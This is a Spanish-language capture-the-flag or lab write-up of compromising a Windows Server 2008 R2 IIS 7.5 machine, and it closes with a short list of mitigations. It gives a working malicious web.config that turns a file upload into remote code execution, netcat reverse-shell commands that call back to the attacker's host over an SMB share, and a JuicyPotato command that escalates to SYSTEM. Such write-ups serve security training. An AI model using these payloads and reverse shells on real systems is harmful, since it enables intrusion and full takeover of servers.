#  Write‑Up --- Windows IIS 7.5 Privilege Escalation (JuicyPotato)

##  Información General

-   **Target:** 10.0.50.42\
-   **Sistema Operativo:** Windows Server 2008 R2 Datacenter x64\
-   **Servicios:** IIS 7.5, SMB, RPC\
-   **Acceso Inicial:** File Upload → RCE\
-   **Escalada:** SeImpersonatePrivilege → JuicyPotato → SYSTEM

------------------------------------------------------------------------

#  Enumeración

Escaneo completo de puertos para ver cuales hay abiertos:

``` bash
nmap -sC -sS -sV -p- 10.0.50.42
```

Resultados relevantes:

    80/tcp    open  http          Microsoft IIS httpd 7.5
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds
    49152/tcp open  msrpc
    49153/tcp open  msrpc
    49154/tcp open  msrpc
    49155/tcp open  msrpc
    49156/tcp open  msrpc
    49158/tcp open  msrpc

Observaciones:

-   Servidor web IIS 7.5 expuesto
-   Método HTTP TRACE habilitado
-   Servicios SMB accesibles

------------------------------------------------------------------------

#  Fuzzing Web

Realizamos un fuzzing de directorios:

``` bash
gobuster dir -u http://10.0.50.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,asp,aspx
```

Se descubre un directorio que nos permite subir archivos pero probando solo nos permite .Png y .Config:

    /zoc.aspx (200)
    

Inspeccionando el HTML se encuentra:

    <!--subiditosdetono-->

Directorio donde se almacenan los archivos subidos.

------------------------------------------------------------------------

#  Abuso de web.config

Se prueba subir un archivo `.config`:

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <directoryBrowse enabled="true" />
  </system.webServer>
</configuration>
```

Confirmamos:

-   Control sobre configuración
-   Escritura en directorio web

------------------------------------------------------------------------

#  Obtención de RCE

Se sube un `web.config` malicioso con codigo RCE que permite ejecución ASP:

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
         scriptProcessor="%windir%\system32\inetsrv\asp.dll"
         resourceType="Unspecified" requireAccess="Write"
         preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

Accediendo al archivo subido obtenemos **Remote Command Execution
(RCE)**.

------------------------------------------------------------------------

#  Acceso Inicial (Reverse Shell)

Copiamos netcat a nuestro directorio de trabajo:

``` bash
cp /usr/share/windows-resources/binaries/nc.exe .
```

Creamos recurso SMB:

``` bash
impacket-smbserver -smb2support sharedFolder .
```

Verificación desde la víctima:

``` cmd
dir \\10.0.50.4\sharedFolder
```

Ponemos un listener en escucha:

``` bash
nc -lvnp 443
```

Ejecutamos reverse shell:

``` cmd
\\10.0.50.4\sharedFolder\nc.exe -e cmd 10.0.50.4 443
```



Shell obtenida como usuario:

    info

------------------------------------------------------------------------

Vvemos carpetas Administrador y e Info de nuestro usuario actual
Navegamos a la carpeta users/info y vemos la user flag en user.txt

#  User Flag

Enumeración de usuarios:

``` cmd
dir C:\Users
```

Acceso:

``` cmd
cd C:\Users\info\Desktop
dir
type user.txt
```

Flag:

    uigsg5sdfdfbv5b6sad98vcdf

------------------------------------------------------------------------

#  Escalada de Privilegios

Enumeramos privilegios:

``` cmd
whoami /priv
```

Detectamos:

    SeImpersonatePrivilege

Sistema vulnerable:

    Windows Server 2008 R2 x64

------------------------------------------------------------------------

#  JuicyPotato Exploit

Ahora escalaremos a Authority/System para leer la flag de Root.exe
Abrimos otro listener.
Vamos a la carpeta donde copiamos nuestro JuicyPotato y ejecutamos, pero antes hay que volver a poner un listener

``` bash
nc -lvnp 443
```

Ejecutamos:

``` cmd
JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "-e cmd 10.0.50.4 443" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

Shell obtenida como:

    NT AUTHORITY\SYSTEM

------------------------------------------------------------------------

#  Root Flag

``` cmd
cd C:\Users\Administrador\Desktop
dir
type root.txt
```

------------------------------------------------------------------------

#  Cadena de Ataque

1.  Enumeración → IIS vulnerable\
2.  Upload funcional → web.config abuse\
3.  RCE → reverse shell\
4.  Privilege enumeration → SeImpersonate\
5.  JuicyPotato → SYSTEM\
6.  Root flag

------------------------------------------------------------------------

#  Mitigaciones

-   Actualizar IIS y sistema operativo
-   Restringir subida de archivos
-   Filtrar extensiones `.config`
-   Principio de mínimo privilegio
-   Deshabilitar SeImpersonate innecesario
-   Implementar WAF

------------------------------------------------------------------------

#  Conclusión

Se logró compromiso total del sistema mediante:

-   Vulnerabilidad de configuración en IIS
-   Abuso de privilegios de impersonación
-   Escalada local a SYSTEM

------------------------------------------------------------------------

#  Habilidades Demostradas

-   Web Exploitation (IIS)
-   File Upload Bypass
-   Windows Privilege Escalation
-   Post‑Exploitation
-   Pivoting básico SMB

> Máquina orientada a entornos corporativos legacy y escenarios reales
> de pentesting.
